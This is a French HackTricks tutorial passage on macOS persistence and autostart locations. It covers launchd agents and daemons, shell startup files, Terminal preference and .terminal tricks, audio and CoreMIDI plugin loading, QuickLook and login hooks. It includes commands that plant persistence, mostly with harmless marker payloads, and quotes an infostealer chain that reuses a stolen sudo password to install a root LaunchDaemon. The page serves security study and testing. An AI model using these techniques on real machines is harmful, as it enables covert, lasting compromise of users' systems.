# Démarrage automatique de macOS

{{#include ../banners/hacktricks-training.md}}

Cette section s'appuie largement sur la série d'articles de blog [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Son objectif est d'identifier les emplacements où l'écriture d'un fichier peut entraîner une exécution de code ultérieure, l'événement qui déclenche cette exécution et les permissions requises. La présence d'un emplacement ne prouve pas que le mécanisme est activé. Les vérifications locales mentionnées ci-dessous ont été effectuées sur macOS 26.5.2 (5 octobre 2026) ; elles ne permettent pas d'établir le comportement de toutes les versions de macOS.

> [!NOTE]
> « Déclenché par une écriture » ne signifie pas toujours « s'exécute immédiatement après l'écriture ». Certains emplacements ne sont lus qu'à la connexion, au démarrage d'une application spécifique ou lorsqu'un utilisateur effectue une action. La possibilité d'écrire une charge utile dans un job déjà configuré est également distincte de la permission d'enregistrer un nouveau job. Faites des tests dans un compte ou une VM jetable avant de vous fier à une technique.

## Contournement du sandbox

> [!TIP]
> Vous trouverez ici des emplacements de démarrage utiles pour le **contournement du sandbox**, qui permettent d'exécuter quelque chose simplement en **l'écrivant dans un fichier** puis en **attendant** une action très **courante**, un **laps de temps** déterminé ou une **action que vous pouvez généralement effectuer** depuis un sandbox sans avoir besoin des permissions root.

### Launchd

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacements

- **`/Library/LaunchAgents`**
  - **Déclencheur** : Connexion de l'utilisateur (ou enregistrement explicite)
  - Permissions root requises
- **`/Library/LaunchDaemons`**
  - **Déclencheur** : Démarrage du système (ou enregistrement explicite)
  - Permissions root requises
- **`/System/Library/LaunchAgents`**
  - **Déclencheur** : Connexion de l'utilisateur ; emplacement système Apple protégé
- **`/System/Library/LaunchDaemons`**
  - **Déclencheur** : Démarrage du système ; emplacement système Apple protégé
- **`~/Library/LaunchAgents`**
  - **Déclencheur** : Nouvelle connexion

Il n'existe pas d'emplacement `~/Library/LaunchDaemons` analysé par `launchd`. Les jobs par utilisateur doivent se trouver dans `~/Library/LaunchAgents` ; le répertoire des daemons système est `/Library/LaunchDaemons`. Le [guide de démarrage launchd d'Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) documente les emplacements analysés.

> [!TIP]
> Fait intéressant, **`launchd`** contient une property list intégrée dans la section Mach-o `__Text.__config`, qui contient d'autres services bien connus que launchd doit démarrer. De plus, ces services peuvent contenir `RequireSuccess`, `RequireRun` et `RebootOnSuccess`, ce qui signifie qu'ils doivent être exécutés et se terminer avec succès.
>
> Bien sûr, elle ne peut pas être modifiée en raison de la signature de code.

#### Description et exploitation

**`launchd`** est le **premier** **processus** exécuté par OX S au démarrage et le dernier à se terminer à l'arrêt. Il doit toujours avoir le **PID 1**. Ce processus va **lire et exécuter** les configurations indiquées dans les **plists** **ASEP** situées dans :

- `/Library/LaunchAgents` : agents par utilisateur installés par l'administrateur
- `/Library/LaunchDaemons` : daemons à l'échelle du système installés par l'administrateur
- `/System/Library/LaunchAgents` : agents par utilisateur fournis par Apple.
- `/System/Library/LaunchDaemons` : daemons à l'échelle du système fournis par Apple.

Lorsqu'un utilisateur se connecte, `launchd` charge les plists du répertoire `~/Library/LaunchAgents` de cet utilisateur avec les permissions de ce dernier. Les jobs démarrent en fonction de leurs clés ; le simple chargement d'une plist n'entraîne pas nécessairement l'exécution immédiate d'un processus.

La **principale différence entre les agents et les daemons est que les agents sont chargés lorsque l'utilisateur se connecte et les daemons au démarrage du système** (car certains services, comme ssh, doivent être exécutés avant qu'un utilisateur accède au système). Les agents peuvent également utiliser une interface graphique, tandis que les daemons doivent s'exécuter en arrière-plan.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Chaque élément de `ProgramArguments` est un argument distinct ; `launchd` n’interprète pas une chaîne unique comme une commande shell. L’exemple corrigé ci-dessus peut être vérifié syntaxiquement sans être chargé avec `plutil -lint /path/to/example.plist`. Consultez l’entrée locale `man launchd.plist` pour `ProgramArguments`, `RunAtLoad` et `KeepAlive`.

#### Déclencheurs d’événements de fichiers dans les jobs existants

Un agent ou daemon **déjà chargé** peut utiliser `WatchPaths` pour démarrer lorsqu’un chemin nommé change. `QueueDirectories` démarre un job tant qu’un répertoire n’est pas vide ; `StartOnMount` le démarre lorsqu’un volume est monté. [Le guide launchd d’Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) comprend des exemples de `WatchPaths` et `QueueDirectories`. L’écriture dans un fichier surveillé déclenche le **job déjà configuré** ; elle n’entraîne une exécution de code arbitraire que si l’auteur peut aussi contrôler l’exécutable, le script ou les données interprétées par le job. Écrire simplement un nouveau plist en dehors d’un emplacement analysé ou enregistré ne le charge pas.

Cette PoC à nettoyage automatique enregistre un **agent utilisateur temporaire** portant un nom unique, ne modifie que son propre fichier surveillé, puis supprime l’agent. Elle a été exécutée avec succès sur macOS 26.5.2, sans déconnexion ni redémarrage :

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

L’exécution locale a affiché `watch fired: True`, et `bootout` a réussi. `launchctl bootstrap` est utilisé ici uniquement dans le PoC isolé ; il n’est **pas** nécessaire pour un job déjà chargé. Pour évaluer sans risque un job existant, lisez son plist et le chemin `ProgramArguments` résolu, puis vérifiez si l’exécutable concerné ou le fichier interprété est accessible en écriture, sans le modifier.

Dans certains cas, un **agent doit être exécuté avant la connexion de l’utilisateur** : on parle alors de **PreLoginAgents**. Cela peut, par exemple, être utile pour fournir une technologie d’assistance à la connexion. On peut également les trouver dans `/Library/LaunchAgents` (voir [**ici**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un exemple).

> [!TIP]
> Les nouveaux fichiers de configuration de Daemons ou d’Agents seront **chargés au prochain redémarrage ou avec** `launchctl load <target.plist>`. Il est **également possible de charger des fichiers .plist sans cette extension** avec `launchctl -F <file>` (ces fichiers plist ne seront toutefois pas chargés automatiquement après un redémarrage).\
> Il est également possible de les **décharger** avec `launchctl unload <target.plist>` (le processus indiqué sera arrêté),
>
> Pour **vous assurer** que **rien** (comme une surcharge) **n’empêche** un **Agent** ou un **Daemon** **de** **s’exécuter**, exécutez : `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Lister tous les agents et daemons chargés par l’utilisateur actuel :

```bash
launchctl list
```

#### Exemple de chaîne malveillante de LaunchDaemon (réutilisation de mot de passe)

Un infostealer macOS récent a réutilisé un **mot de passe sudo capturé** pour déposer un user agent et un LaunchDaemon root :<sup>[[1]](#references)</sup>

- Écrire la boucle de l’agent dans `~/.agent` et la rendre exécutable.
- Générer un plist dans `/tmp/starter` pointant vers cet agent.
- Réutiliser le mot de passe volé avec `sudo -S` pour le copier dans `/Library/LaunchDaemons/com.finder.helper.plist`, définir `root:wheel` et le charger avec `launchctl load`.
- Démarrer l’agent discrètement avec `nohup ~/.agent >/dev/null 2>&1 &` pour détacher la sortie.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Un plist de daemon placé dans `/Library/LaunchDaemons` n'est pas sécurisé simplement parce qu'il appartient à un utilisateur. `launchd` exige une propriété et des permissions appropriées pour les tâches système et peut rejeter un plist non sécurisé. Un daemon appartenant à root s'exécute normalement en tant que root, sauf si sa configuration sélectionne un autre compte. Vérifiez les valeurs `UserName` et `GroupName`, la propriété, ainsi que les diagnostics de `launchctl` ; ne déduisez pas l'identité d'exécution du seul nom du propriétaire du plist.

#### Plus d'informations sur launchd

**`launchd`** est le **premier** processus en mode utilisateur démarré par le **kernel**. Son démarrage doit **réussir** et il **ne peut pas se terminer ni planter**. Il est même **protégé** contre certains **signaux d'arrêt**.

L'une des premières choses que `launchd` ferait est de **démarrer** tous les **daemons**, par exemple :

- **Daemons de minuterie** déclenchés selon un horaire :
  - `com.apple.atrun.plist` invoque `/usr/libexec/atrun` avec `StartInterval = 30` secondes sous macOS 26.5.2 ; son état d'activation effectif peut différer de la clé `Disabled` du plist, car launchd stocke les dérogations séparément.
  - `com.vix.cron.plist` invoque `/usr/sbin/cron` lorsque `/usr/lib/cron/tabs` contient des tâches. `com.apple.systemstats.daily` est un autre service planifié, et non le daemon cron.
- **Daemons réseau**, tels que :
  - `org.cups.cups-lpd` : écoute en TCP (`SockType: stream`) avec `SockServiceName: printer`
    - SockServiceName doit être un port ou un service défini dans `/etc/services`
  - `com.apple.xscertd.plist` : écoute sur le port TCP 1640
- **Daemons de chemin** exécutés lorsqu'un chemin spécifié change :
  - `com.apple.postfix.master` : surveille le chemin `/etc/postfix/aliases`
- **Daemons de notifications IOKit** :
  - `com.apple.xartstorageremoted` : `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Port Mach :**
  - `com.apple.xscertd-helper.plist` : l'entrée `MachServices` indique le nom `com.apple.xscertd.helper`
- **UserEventAgent :**
  - Il diffère du précédent. Il fait en sorte que launchd lance des applications en réponse à un événement spécifique. Cependant, dans ce cas, le binaire principal concerné n'est pas `launchd`, mais `/usr/libexec/UserEventAgent`. Il charge des plugins depuis le dossier restreint par SIP /System/Library/UserEventPlugins/, où chaque plugin indique son initialiseur dans la clé `XPCEventModuleInitializer` ou, dans le cas des anciens plugins, dans le dict `CFPluginFactories`, sous la clé `FB86416D-6164-2070-726F-70735C216EC0` de son `Info.plist`.

### Fichiers de démarrage du shell

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Compte rendu (xterm) : [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
  - Mais vous devez trouver une application avec un contournement de TCC qui exécute un shell chargeant ces fichiers

#### Emplacements

- **`~/.zshenv`** (ou une version compilée plus récente, **`~/.zshenv.zwc`**)
  - **Déclencheur** : toute invocation ordinaire de zsh, y compris un `zsh -c` non interactif ; `zsh -f` ignore les fichiers de démarrage utilisateur.
- **`~/.zshrc`**
  - **Déclencheur** : démarrage d'un zsh interactif.
- **`~/.zprofile`, `~/.zlogin`**
  - **Déclencheur** : démarrage d'un zsh de connexion ; ces fichiers sont lus respectivement avant et après `.zshrc`.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Déclencheur** : ouverture d'un terminal avec zsh
  - Droits root requis
- **`~/.zlogout`**
  - **Déclencheur** : fin normale d'un zsh de connexion, et non à chaque fermeture de terminal ou de shell.
- **`/etc/zlogout`**
  - **Déclencheur** : fermeture d'un terminal avec zsh
  - Droits root requis
- Éventuellement d'autres éléments dans : **`man zsh`**
- **`~/.bashrc`**
  - **Déclencheur** : démarrage d'un Bash interactif **sans connexion**. Un Bash interactif de connexion ne le lit que si un fichier de connexion le source explicitement.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Déclencheur** : démarrage d'un Bash de connexion ; le premier fichier lisible dans cet ordre est exécuté. `~/.profile` est ignoré si l'un des deux fichiers précédents existe.
- **`/etc/profile`**
  - **Déclencheur** : démarrage d'un Bash de connexion ; sa modification nécessite les droits root.
- **`~/.tcshrc`** ou, s'il est absent, **`~/.cshrc`**
  - **Déclencheur** : démarrage de `tcsh`, y compris un `tcsh -c` non interactif sur ce Mac. L'utilisateur doit réellement invoquer `tcsh` ; ce n'est pas le shell par défaut de macOS.
- **`~/.login`**
  - **Déclencheur** : démarrage d'un `tcsh` de connexion, après son fichier rc.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Déclencheur** : devrait se déclencher avec xterm, mais celui-ci **n'est pas installé** et, même après son installation, cette erreur apparaît : xterm : `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Description et exploitation

Lors du démarrage d'un environnement shell tel que `zsh` ou `bash`, **certains fichiers de démarrage sont exécutés**. macOS utilise actuellement `/bin/zsh` comme shell par défaut. Le fait que Terminal ou SSH démarre un shell de connexion ou interactif dépend de leur configuration ; ne supposez pas que tous les fichiers ci-dessus sont exécutés à chaque session. Bien que `bash` et `sh` soient également présents dans macOS, ils doivent être invoqués explicitement pour être utilisés.<sup>[[2]](#references)</sup> La [référence des fichiers de démarrage de zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) précise l'ordre, la substitution `ZDOTDIR` et la règle `.zwc`.

L'expérience en lecture seule suivante a utilisé un `ZDOTDIR` jetable sous macOS 26.5.2. Elle montre quels fichiers utilisateur ont été lus ; aucun véritable fichier de démarrage du shell n'a été modifié :

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

L’ordre observé était `-c` : `zshenv` ; `-ic` : `zshenv zshrc` ; `-lc` : `zshenv zprofile zlogin` ; `-lic` : `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` doit déjà pointer vers le répertoire alternatif ; il ne suffit pas d’écrire des fichiers dans un répertoire quelconque.

La [référence de démarrage de Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) distingue les shells de connexion des shells interactifs. Sur la machine de test macOS 26.5.2, un `HOME` isolé contenant les quatre fichiers de démarrage utilisateur a produit les résultats suivants : `bash -c` → aucun ; `bash -ic` → `.bashrc` ; `bash -lc` et `bash -lic` → `.bash_profile` uniquement. Après suppression de `.bash_profile`, Bash de connexion a lu `.bash_login`, puis `.profile` après suppression de ce dernier. `BASH_ENV` peut indiquer à Bash non interactif un fichier à lire, mais cette variable d’environnement doit déjà être définie dans le processus appelant. Une commande `exit` explicite dans Bash de connexion peut également charger `~/.bash_logout`.

Le manuel local `tcsh(1)` décrit son ordre de démarrage distinct. Avec un `HOME` temporaire, `/bin/tcsh -c :` a lu `.tcshrc`, ou `.cshrc` si `.tcshrc` était absent. Un `tcsh` de connexion temporaire a lu `.tcshrc` et `.login`. Ces vérifications ont créé et supprimé uniquement des fichiers temporaires.

### Applications rouvertes

> [!CAUTION]
> La configuration de l’exploitation indiquée, suivie d’une déconnexion puis d’une nouvelle connexion, voire d’un redémarrage, n’a pas exécuté l’application lors des tests. Il se peut que l’application doive être en cours d’exécution au moment de ces opérations.

**Writeup** : [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Déclencheur** : réouverture des applications au redémarrage

#### Description et exploitation

Toutes les applications à rouvrir se trouvent dans le plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Pour que les applications rouvertes lancent la vôtre, il vous suffit de **l’ajouter à la liste**.

Vous pouvez trouver l’UUID en listant ce répertoire ou avec `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Pour vérifier quelles applications seront rouvertes, vous pouvez exécuter :

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Pour **ajouter une application à cette liste**, vous pouvez utiliser :

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Préférences de Terminal

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- TCC bypass : [✅](https://emojipedia.org/check-mark-button)
  - Terminal avait auparavant les permissions FDA de l’utilisateur qui l’utilisait

#### Emplacement

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Déclencheur** : Ouvrir une nouvelle fenêtre ou un nouvel onglet Terminal avec le profil dont les réglages Shell contiennent la commande de démarrage

#### Description et exploitation

Dans **`~/Library/Preferences`** sont stockées les préférences de l’utilisateur pour les applications. Certaines de ces préférences peuvent contenir une configuration permettant **d’exécuter d’autres applications/scripts**.<sup>[[5]](#references)</sup>

Par exemple, Terminal peut exécuter une commande au démarrage :

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Cette configuration est reflétée dans le fichier **`~/Library/Preferences/com.apple.Terminal.plist`** comme ceci :

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Si le profil concerné contient une commande de démarrage et que Terminal lit cette préférence, une nouvelle session utilisant ce profil peut l’exécuter. [Le guide actuel de Terminal d’Apple](https://support.apple.com/guide/terminal/trmlshll/mac) documente la commande par profil **Shell → Startup**. Le simple fait d’ouvrir Terminal sans démarrer une nouvelle session avec ce profil ne suffit pas. Les modifications de préférences ci-dessous n’ont **pas** été effectuées sur le Mac de recherche.

Vous pouvez l’ajouter depuis la CLI avec :

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Scripts Terminal / autres extensions de fichier

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
  - Terminal l’utilisait pour obtenir les permissions FDA de l’utilisateur

#### Emplacement

- **N’importe où**
  - **Déclencheur** : Ouvrir le fichier `.terminal`, `.command` ou `.tool` concerné

#### Description et exploitation

Si un utilisateur ouvre un fichier de paramètres **`.terminal`**, Terminal peut créer une session à partir de son profil ; les fichiers exécutables **`.command`** et **`.tool`** peuvent également s’ouvrir dans Terminal. Il s’agit d’un déclencheur explicite à l’ouverture d’un fichier, et non d’une exécution provoquée par le simple fait d’ouvrir Terminal. Tout accès TCC hérité dépend des autorisations réellement accordées à Terminal et de l’opération tentée. L’exemple historique ci-dessous n’a pas été exécuté sur le Mac de recherche.

Essayez avec :

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Vous pouvez également utiliser les extensions **`.command`**, **`.tool`**, avec du contenu de scripts shell classiques ; elles seront également ouvertes par Terminal.

> [!CAUTION]
> Si Terminal dispose de l’**Accès complet au disque**, il pourra effectuer cette action (notez que la commande exécutée sera visible dans une fenêtre Terminal).

### Plugins audio

Article : [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Article : [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement de TCC : [🟠](https://emojipedia.org/large-orange-circle)
  - Vous pourriez obtenir des accès TCC supplémentaires

#### Emplacement

- **`/Library/Audio/Plug-Ins/HAL`**
  - Droits root requis
  - **Déclencheur** : le serveur Core Audio charge un plug-in de périphérique HAL compatible ; un redémarrage du serveur peut entraîner une nouvelle détection
- **`/Library/Audio/Plug-ins/Components`**
  - Droits root requis
  - **Déclencheur** : un hôte audio détecte et instancie l’Audio Unit installé
- **`~/Library/Audio/Plug-ins/Components`**
  - **Déclencheur** : un hôte audio détecte et instancie l’Audio Unit installé
- **`/System/Library/Components`**
  - Emplacement fourni par Apple et protégé par le système
  - **Déclencheur** : un hôte audio instancie un composant système correspondant

#### Description

D’après les articles précédents, il est possible de **compiler certains plugins audio** et de les faire charger.<sup>[[6]](#references)[[7]](#references)</sup>

Les plug-ins de périphérique HAL et les Audio Units suivent des chemins de chargement distincts. Le [guide d’Apple sur l’hébergement des Audio Units](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) indique qu’un hôte doit trouver et instancier un composant ; le copier dans un répertoire analysé ou redémarrer `coreaudiod` ne prouve pas à lui seul qu’il a été exécuté. Les plug-ins AUv2 s’exécutent dans le processus hôte, tandis que les [directives actuelles d’Apple sur les Audio Units](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) indiquent que, par défaut, AUv3 s’exécute dans un processus distinct sur macOS. Les contrôles de signature, de sandbox et de validation des bibliothèques dépendent de l’hôte. Aucun plug-in audio n’a été installé ni exécuté sur le Mac utilisé pour la recherche.

### Drivers CoreMIDI (MIDIServer)

Article : [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Votre code s’exécute dans le processus `MIDIServer`, et non dans le sandbox de votre application
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` s’exécute avec son propre profil de sandbox `seatbelt`

#### Emplacement

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Aucun droit root requis (accessible en écriture par l’utilisateur)
  - **Déclencheur** : `MIDIServer` démarre ou redémarre. Il est lancé à la demande, la première fois qu’un processus utilise CoreMIDI (ouverture de *Configuration audio et MIDI*, GarageBand, d’un DAW ou d’une page utilisant WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Droits root requis
  - **Déclencheur** : identique à ci-dessus

#### Description et exploitation

Le `MIDIServer` d’Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) charge les bundles de **drivers** MIDI depuis les répertoires `Audio/MIDI Drivers`. Le binaire est signé par Apple, mais est livré avec l’entitlement `com.apple.security.cs.disable-library-validation` ; il peut donc charger un bundle **non signé ou signé ad hoc par une autre équipe**, ce qui permet d’exécuter du code dans un processus distinct appartenant à Apple **sans droits root**.<sup>[[53]](#references)</sup>

Vérifié sur macOS 26 (en lecture seule) :

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Un driver est un bundle standard qui exporte une fabrique `MIDIDriverInterface` ; placer le payload dans la fabrique/le constructeur le fait s’exécuter dès que `MIDIServer` énumère les drivers. Compilez-le, déposez-le sous `~/Library/Audio/MIDI Drivers/Evil.plugin`, puis déclenchez son chargement sans déconnexion ni redémarrage :

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### Plugins QuickLook

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement de TCC : [🟠](https://emojipedia.org/large-orange-circle)
  - Vous pouvez obtenir des accès TCC supplémentaires

#### Emplacement

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description et exploitation

Les plugins QuickLook peuvent être exécutés lorsque vous **déclenchez l’aperçu d’un fichier** (appuyez sur la barre d’espace lorsque le fichier est sélectionné dans le Finder) et qu’un **plugin prenant en charge ce type de fichier** est installé.<sup>[[8]](#references)</sup>

Il est possible de compiler votre propre plugin QuickLook, de le placer dans l’un des emplacements précédents pour le charger, puis d’ouvrir un fichier pris en charge et d’appuyer sur la barre d’espace pour le déclencher.

Ces chemins correspondent aux anciens bundles `.qlgenerator` ; [le guide d’architecture Quick Look d’Apple](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) décrit l’ordre de recherche et les types de fichiers associés. Les **extensions d’app Quick Look** actuelles sont intégrées à une app et suivent des règles différentes d’enregistrement et d’exécution. La présence d’un générateur ne prouve pas qu’il sera sélectionné pour le type de fichier ni que son code s’exécutera dans le Finder lui-même. Le chemin des anciens générateurs a été vérifié à partir de la documentation et de la présence du répertoire ; aucun générateur n’a été installé ni chargé sur le Mac de recherche.

### ~~Hooks de connexion/déconnexion~~

> [!CAUTION]
> Cela n’a pas fonctionné pour moi, ni avec le LoginHook de l’utilisateur ni avec le LogoutHook de root.

**Compte rendu** : [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Vous devez pouvoir exécuter quelque chose comme `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
  - `Situé` dans `~/Library/Preferences/com.apple.loginwindow.plist`

Ils sont obsolètes, mais peuvent servir à exécuter des commandes lorsqu’un utilisateur ouvre une session.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Ce paramètre est stocké dans `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Pour le supprimer :

```bash
defaults delete com.apple.loginwindow LoginHook
